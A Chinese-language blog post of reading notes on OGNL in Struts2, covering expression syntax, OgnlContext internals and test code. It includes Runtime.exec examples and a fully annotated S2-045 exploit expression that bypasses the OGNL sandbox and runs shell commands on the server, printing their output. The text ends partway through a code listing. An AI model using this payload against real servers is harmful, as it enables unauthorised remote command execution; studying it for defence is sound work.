<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <title>深入理解OGNL - Dean&#39;s notes</title>
  <meta property="og:title" content="深入理解OGNL - Dean&#39;s notes" />
  <meta name="twitter:title" content="深入理解OGNL - Dean&#39;s notes" />
  <meta name="description" content="OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。
 0x01 为什么要引入表达式引擎 ？表达式引擎在Web开发中有什么重要作用 ？  同一个对象 ，在 “弱类型 ”的平台和一个 “强类型 ”的平台之间交互 ，就必须有一个非常重要的 “翻译 ”角色解决这种 “不匹配 ” 。这个角色 ，就是我们所说的表达式引擎 ，它充当着桥梁作用 ，保证数据能够顺利地在MVC的各个层次进行流转 。  0x02 一个合格的表达式语言应该具备什么？  能够处理表达式与对象之间的映射关系，并且这种关系是双向的。 能够支持丰富多样的表达式语法计算。 能够支持必要的数据类型转换.">
  <meta property="og:description" content="OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。
 0x01 为什么要引入表达式引擎 ？表达式引擎在Web开发中有什么重要作用 ？  同一个对象 ，在 “弱类型 ”的平台和一个 “强类型 ”的平台之间交互 ，就必须有一个非常重要的 “翻译 ”角色解决这种 “不匹配 ” 。这个角色 ，就是我们所说的表达式引擎 ，它充当着桥梁作用 ，保证数据能够顺利地在MVC的各个层次进行流转 。  0x02 一个合格的表达式语言应该具备什么？  能够处理表达式与对象之间的映射关系，并且这种关系是双向的。 能够支持丰富多样的表达式语法计算。 能够支持必要的数据类型转换.">
  <meta name="twitter:description" content="OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。
 0x01 为什么要引入表达式引擎 ？表达式引擎在Web开发中有什么重要作用 ？  同一个对象 ，在 “弱类型 ”的平台和一个 “ …">
  <meta name="author" content="Dean"/>
  <meta property="og:site_name" content="Dean&#39;s notes" />
  <meta property="og:url" content="https://dean2021.github.io/posts/struts2-internals-readbook-note_03/" />
  <meta property="og:type" content="article" />
  <meta name="twitter:card" content="summary" />
  <meta name="generator" content="Hugo 0.52" />

  <link rel="stylesheet" href="/css/style.css" media="all" />
  <link rel="stylesheet" href="/css/syntax.css" media="all" />
  <link rel="stylesheet" href="/css/custom.css" media="all" />

  <script src="/js/script.js"></script>
  <script src="/js/custom.js"></script>
  <script defer src="/js/fontawesome.js"></script>
</head>

<body>

<header class="site-header">
  <nav class="site-navi">
    <h1 class="site-title"><a href="/">Dean&#39;s notes</a></h1>
    <ul class="site-navi-items">
      <li class="site-navi-item-home"><a href="/" title="Home">Home</a></li>
      <li class="site-navi-item-categories"><a href="/categories/" title="Categories">Categories</a></li>
      <li class="site-navi-item-tags"><a href="/tags/" title="Tags">Tags</a></li>
      <li class="site-navi-item-archives"><a href="/archives/" title="Archives">Archives</a></li>
      <li class="site-navi-item-books"><a href="/books/" title="Books">Books</a></li>
      <li class="site-navi-item-about"><a href="/about/" title="About">About</a></li>
    </ul>
  </nav>
</header>
<hr class="site-header-bottom">

  <div class="main" role="main">
    <article class="article">
      
      
      <h1 class="article-title">深入理解OGNL</h1>
      
      <hr class="article-title-bottom">
      <ul class="article-meta">
        <li class="article-meta-date"><time>November 23, 2018</time></li>
        <li class="article-meta-categories">
          <a href="/categories/java/">
            <i class="fas fa-folder"></i>
            java
          </a>&nbsp;
        </li>
        <li class="article-meta-categories">
          <a href="/categories/struts2-%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/">
            <i class="fas fa-folder"></i>
            Struts2 技术内幕
          </a>&nbsp;
        </li>
        <li class="article-meta-tags">
          <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
            <i class="fas fa-tag"></i>
            读书笔记
          </a>&nbsp;
        </li>
      </ul>
      
<aside class="toc">
  <nav id="TableOfContents">
<ul>
<li>
<ul>
<li>
<ul>
<li><a href="#0x01-为什么要引入表达式引擎-表达式引擎在web开发中有什么重要作用">0x01 为什么要引入表达式引擎 ？表达式引擎在Web开发中有什么重要作用 ？</a></li>
<li><a href="#0x02-一个合格的表达式语言应该具备什么">0x02 一个合格的表达式语言应该具备什么？</a></li>
<li><a href="#0x03-ognl的三要素是什么">0x03 OGNL的三要素是什么 ？</a></li>
<li><a href="#0x04-ognl有哪些基本操作">0x04 OGNL有哪些基本操作 ？</a></li>
<li><a href="#0x05-在ognl中-针对root对象的计算与针对上下文环境的计算有什么不同">0x05 在OGNL中 ，针对Root对象的计算与针对上下文环境的计算有什么不同 ？</a></li>
<li><a href="#0x06-ognl的计算行为是在哪些ognl内部的变量中指定的">0x06 OGNL的计算行为是在哪些OGNL内部的变量中指定的 ？</a></li>
<li><a href="#0x007-ognl在计算时是如何处理类型转化的-又是如何处理级联对象的初始化行为的">0x007 OGNL在计算时是如何处理类型转化的 ？又是如何处理级联对象的初始化行为的 ？</a></li>
<li><a href="#0x008-xwork都扩展了ognl那些类">0x008  XWork都扩展了OGNL那些类？</a></li>
<li><a href="#0x09-如何在xwork中扩展ognl计算中的类型转化">0x09 如何在XWork中扩展OGNL计算中的类型转化 ？</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
</aside>
      

<blockquote>
<p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。</p>
</blockquote>

<h3 id="0x01-为什么要引入表达式引擎-表达式引擎在web开发中有什么重要作用">0x01 为什么要引入表达式引擎 ？表达式引擎在Web开发中有什么重要作用 ？</h3>

<ol>
<li>同一个对象 ，在 “弱类型 ”的平台和一个 “强类型 ”的平台之间交互 ，就必须有一个非常重要的 “翻译 ”角色解决这种 “不匹配 ” 。这个角色 ，就是我们所说的表达式引擎 ，它充当着桥梁作用 ，保证数据能够顺利地在MVC的各个层次进行流转 。</li>
</ol>

<h3 id="0x02-一个合格的表达式语言应该具备什么">0x02 一个合格的表达式语言应该具备什么？</h3>

<ol>
<li>能够处理表达式与对象之间的映射关系，并且这种关系是双向的。</li>
<li>能够支持丰富多样的表达式语法计算。</li>
<li>能够支持必要的数据类型转换.</li>
</ol>

<h3 id="0x03-ognl的三要素是什么">0x03 OGNL的三要素是什么 ？</h3>

<ol>
<li><p>表达式: 表达式是OGNL的核心，来确定 “要干什么”</p></li>

<li><p>Root对象: OGNL表达式要操作的具体对象(读、写)， 来确定 “要干谁”&hellip;哈哈</p></li>

<li><p>上下文环境: 所有的对象的读写操作都会在一个特定的数据环境中运行，这个就是上下文环境， 也就是确定“在哪里干？”</p></li>
</ol>

<blockquote>
<p>TIPS: 有时候我们在使用getValue的时候仅传递了两个参数getValue(exp, root),其实底层代码会调用addDefaultContext创建一个OgnlContext对象为默认的Context</p>
</blockquote>

<h3 id="0x04-ognl有哪些基本操作">0x04 OGNL有哪些基本操作 ？</h3>

<ol>
<li>对Root对象的访问: 通过<code>.</code>来访问.</li>
<li>对上下文环境的访问: 通过<code>#</code>来访问，如 #foo</li>
<li>对静态变量的访问： 通过<code>@</code>来访问</li>
<li>调用方法： 类似java的方法调用，支持传参</li>
<li>使用操作符进行计算: 支持<code>+ 、- 、* 、 / 、++ 、-- 、 == 、 in 、 mod 、 not in</code></li>
<li>对数组和容器的访问： OGNL支持根据键值进行访问，例如 : #foo[&lsquo;key&rsquo;]、#foo[0].user</li>
<li>投影(projection)与选择(selection):

<ol>
<li>投影：投影是指选出集合中每个元素的相同属性组成一个新的集合，类似于关系数据的字段操作。 操作语法: collection.{ XXXX }</li>
<li>选择：选择就是过滤满足selection条件的集合元素，类似于关系数据库的结果集操作。  操作语法: collection.{X YYY}, 其中X是一个选择操作符，后面则是逻辑表达式：

<ol>
<li>？: 选择满足条件的所有元素</li>
<li>^ : 选择满足条件的第一个元素</li>
<li>$ : 选择满足条件的最后一个元素</li>
</ol></li>
</ol></li>
<li>构造对象：

<ol>
<li>构造List： 使用<code>{}</code>，中间使用逗号隔开</li>
<li>构造Map：使用<code>#{}</code>, 逗号隔开键值对，冒号隔开key和value， 如<code>{ &quot;key1&quot;:&quot;val1&quot;, &quot;key2&quot;:&quot;val2&quot;}</code></li>
<li>构造Object: 使用已知的对象的构造函数来构造对象,例如: <code>#foo=new java.net.URL(&quot;http://xxx.com&quot;)</code></li>
</ol></li>

<li><p>深入this指针: 指向当前调用者对应的实例，例如：<code>users.{ ?#this.age &gt; 3}</code></p></li>

<li><p>有关<code>#</code>的三个用途：</p>

<ol>
<li># 加在普通OGNL表达式前面，用于访问OGNL上下文中的变量</li>
<li>使用<code>#{}</code>语法动态创建Map</li>
<li># 加载this指针前，表示对this指针的引用</li>
</ol></li>
</ol>

<p>OGNL投影、选择实例代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- 正则表达式中，&#34;^&#34;代表开头，&#34;$&#34;代表结尾，&#34;?&#34;代表过滤 --&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>投影(过滤)：<span class="p">&lt;</span><span class="nt">s:property</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;users.{?#this.age==1}.{age}&#34;</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> 
<span class="c">&lt;!-- 找到所有年龄大于1的user，取第一个 --&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>投影：<span class="p">&lt;</span><span class="nt">s:property</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;users.{^#this.age&gt;1}.{age}&#34;</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> 
<span class="c">&lt;!-- 找到所有年龄大于1的user，取最后一个 --&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>投影：<span class="p">&lt;</span><span class="nt">s:property</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;users.{$#this.age&gt;1}.{age}&#34;</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> 
<span class="c">&lt;!-- 找到所有年龄大于1的集合，判断这个集合是否为空 --&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>投影：<span class="p">&lt;</span><span class="nt">s:property</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;users.{$#this.age&gt;1}.{age} == null&#34;</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span></code></pre></td></tr></table>
</div>
</div>
<blockquote>
<p>TIPS： 静态变量或静态方法的访问，需要通过 @[class]@[field/method]的表达式语法来进行.</p>
</blockquote>

<p>OGNL操作静态方法实例代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// 调用静态方法
</span><span class="c1"></span><span class="n">OgnlContext</span> <span class="n">ognlContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
<span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="s">&#34;@java.lang.Runtime@getRuntime().exec(&#39;open /Applications/Calculator.app&#39;)&#34;</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">ognlContext</span><span class="o">.</span><span class="na">getRoot</span><span class="o">());</span>


<span class="c1">// 定义变量，并调用方法，及给方法传参
</span><span class="c1"></span><span class="n">OgnlContext</span> <span class="n">ognlContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
<span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="s">&#34;#foo=&#39;open /Applications/Calculator.app&#39;,@java.lang.Runtime@getRuntime().exec(#foo)&#34;</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">ognlContext</span><span class="o">.</span><span class="na">getRoot</span><span class="o">());</span></code></pre></td></tr></table>
</div>
</div>
<p>S2-045漏洞的OGNL表达式分析：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// 定义一个变量
</span><span class="c1"></span><span class="o">(</span><span class="err">#</span><span class="n">nike</span><span class="o">=</span><span class="err">&#39;</span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="err">&#39;</span><span class="o">).</span>

<span class="c1">// dm变量为ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
</span><span class="c1"></span><span class="o">(</span><span class="err">#</span><span class="n">dm</span><span class="o">=</span><span class="nd">@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class="o">).</span>

<span class="c1">// 绕过沙箱
</span><span class="c1"></span><span class="o">(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">?(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">=</span><span class="err">#</span><span class="n">dm</span><span class="o">):(</span>


    <span class="c1">// 获取容器
</span><span class="c1"></span>  <span class="o">(</span><span class="err">#</span><span class="n">container</span><span class="o">=</span><span class="err">#</span><span class="n">context</span><span class="o">[</span><span class="err">&#39;</span><span class="n">com</span><span class="o">.</span><span class="na">opensymphony</span><span class="o">.</span><span class="na">xwork2</span><span class="o">.</span><span class="na">ActionContext</span><span class="o">.</span><span class="na">container</span><span class="err">&#39;</span><span class="o">]).</span>

  <span class="c1">// 通过容器获取OgnlUtil类
</span><span class="c1"></span>  <span class="o">(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">=</span><span class="err">#</span><span class="n">container</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="nd">@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class="o">)).</span>

  <span class="c1">// 通过OgnlUtil类获取excludedPackageNames, excludedPackageNames是一个Set类型，然后调用clear方法清空
</span><span class="c1"></span>  <span class="o">(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">.</span><span class="na">getExcludedPackageNames</span><span class="o">().</span><span class="na">clear</span><span class="o">()).</span>

    <span class="c1">// 原理同上
</span><span class="c1"></span>  <span class="o">(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">.</span><span class="na">getExcludedClasses</span><span class="o">().</span><span class="na">clear</span><span class="o">()).</span>

     
    <span class="c1">// 设置memeberAceess
</span><span class="c1"></span>  <span class="o">(</span><span class="err">#</span><span class="n">context</span><span class="o">.</span><span class="na">setMemberAccess</span><span class="o">(</span><span class="err">#</span><span class="n">dm</span><span class="o">)))</span>
<span class="o">).</span>

<span class="o">(</span><span class="err">#</span><span class="n">cmd</span><span class="o">=</span><span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span><span class="o">).</span>

<span class="o">(</span><span class="err">#</span><span class="n">iswin</span><span class="o">=(</span><span class="nd">@java.lang.System@getProperty</span><span class="o">(</span><span class="err">&#39;</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="err">&#39;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="err">&#39;</span><span class="n">win</span><span class="err">&#39;</span><span class="o">))).</span>

<span class="o">(</span><span class="err">#</span><span class="n">cmds</span><span class="o">=(</span><span class="err">#</span><span class="n">iswin</span><span class="o">?{</span><span class="err">&#39;</span><span class="n">cmd</span><span class="o">.</span><span class="na">exe</span><span class="sc">&#39;,&#39;</span><span class="o">/</span><span class="n">c</span><span class="err">&#39;</span><span class="o">,</span><span class="err">#</span><span class="n">cmd</span><span class="o">}:{</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="sc">&#39;,&#39;</span><span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="o">,</span><span class="err">#</span><span class="n">cmd</span><span class="o">})).</span>

<span class="o">(</span><span class="err">#</span><span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ProcessBuilder</span><span class="o">(</span><span class="err">#</span><span class="n">cmds</span><span class="o">)).</span>

<span class="o">(</span><span class="err">#</span><span class="n">p</span><span class="o">.</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">)).</span>

<span class="o">(</span><span class="err">#</span><span class="n">process</span><span class="o">=</span><span class="err">#</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">()).</span>

<span class="o">(</span><span class="err">#</span><span class="n">ros</span><span class="o">=(</span><span class="nd">@org.apache.struts2.ServletActionContext@getResponse</span><span class="o">().</span><span class="na">getOutputStream</span><span class="o">())).</span>

<span class="o">(</span><span class="nd">@org.apache.commons.io.IOUtils@copy</span><span class="o">(</span><span class="err">#</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="err">#</span><span class="n">ros</span><span class="o">)).</span>


<span class="o">(</span><span class="err">#</span><span class="n">ros</span><span class="o">.</span><span class="na">flush</span><span class="o">())</span></code></pre></td></tr></table>
</div>
</div>
<p>OGNL读写对象的实例代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">junit.framework.TestCase</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ognl.Ognl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ognl.OgnlException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.junit.Test</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OgnlTest</span> <span class="kd">extends</span> <span class="n">TestCase</span> <span class="o">{</span>


    <span class="nd">@Test</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">OgnlException</span> <span class="o">{</span>


        <span class="c1">// 创建root对象
</span><span class="c1"></span>        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
        <span class="n">user</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;My name is Test&#34;</span><span class="o">);</span>

        <span class="c1">// 创建上下文
</span><span class="c1"></span>        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;foo&#34;</span><span class="o">,</span> <span class="s">&#34;Hello world&#34;</span><span class="o">);</span>


        <span class="c1">// 从root对象中获取计算结果
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">Ognl</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">),</span> <span class="n">user</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>


        <span class="c1">// 从上下文中获取计算结果
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">Value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">Ognl</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="s">&#34;#foo&#34;</span><span class="o">),</span> <span class="n">context</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Value</span><span class="o">);</span>


        <span class="c1">// 获取上下文中的计算结果 + root对象里的计算结果
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">Ognl</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="s">&#34;#foo + name&#34;</span><span class="o">),</span> <span class="n">context</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">v1</span><span class="o">);</span>


        <span class="c1">// 对root对象进行写操作
</span><span class="c1"></span>        <span class="n">Ognl</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">Ognl</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">),</span> <span class="n">user</span><span class="o">,</span> <span class="s">&#34;My name is dean&#34;</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>

    <span class="o">}</span>

    <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>运行输出:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">My</span> <span class="n">name</span> <span class="n">is</span> <span class="n">Test</span>
<span class="n">Hello</span> <span class="n">world</span>
<span class="n">Hello</span> <span class="n">worldMy</span> <span class="n">name</span> <span class="n">is</span> <span class="n">Test</span>
<span class="n">My</span> <span class="n">name</span> <span class="n">is</span> <span class="n">dean</span></code></pre></td></tr></table>
</div>
</div>
<h3 id="0x05-在ognl中-针对root对象的计算与针对上下文环境的计算有什么不同">0x05 在OGNL中 ，针对Root对象的计算与针对上下文环境的计算有什么不同 ？</h3>

<ol>
<li>仅表达式写法上的差异，从计算规则角度上并没有差异,如: 对Root对象的访问: 通过<code>.</code>来访问. 对上下文环境的访问: 通过<code>#</code>来访问</li>
</ol>

<h3 id="0x06-ognl的计算行为是在哪些ognl内部的变量中指定的">0x06 OGNL的计算行为是在哪些OGNL内部的变量中指定的 ？</h3>

<ol>
<li>_root : 在OginlContext内维护的Root对象，它是OGNL主要操作对象.</li>
<li>_values : 传入map作为上下文，ognl依然会创建一个OgnlContext对象，并将传递的map中所有键值维护在_value里, 具体代码如下:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">OgnlContext</span> <span class="kd">extends</span> <span class="n">Object</span> <span class="kd">implements</span> <span class="n">Map</span>
<span class="o">{</span>

    <span class="c1">// ... 省略
</span><span class="c1"></span>
    <span class="kd">private</span> <span class="n">Map</span> <span class="n">_values</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="n">23</span><span class="o">);</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setValues</span><span class="o">(</span><span class="n">Map</span> <span class="n">value</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="k">for</span><span class="o">(</span><span class="n">Iterator</span> <span class="n">it</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="na">keySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">it</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();)</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">k</span> <span class="o">=</span> <span class="n">it</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>

            <span class="n">_values</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">k</span><span class="o">,</span> <span class="n">value</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">k</span><span class="o">));</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="c1">// ..省略
</span><span class="c1"></span><span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<ol>
<li>ClassResolver : class加载处理类，默认使用JVM的class.forName实现</li>
<li>TypeConverter(类型转换): 类型转换处理类</li>
<li>MemberAccess : 指定处理属性访问策略的处理方式, 默认禁止访问private、protected、package protected的访问</li>
</ol>

<p>我们一窥OgnlContext类代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
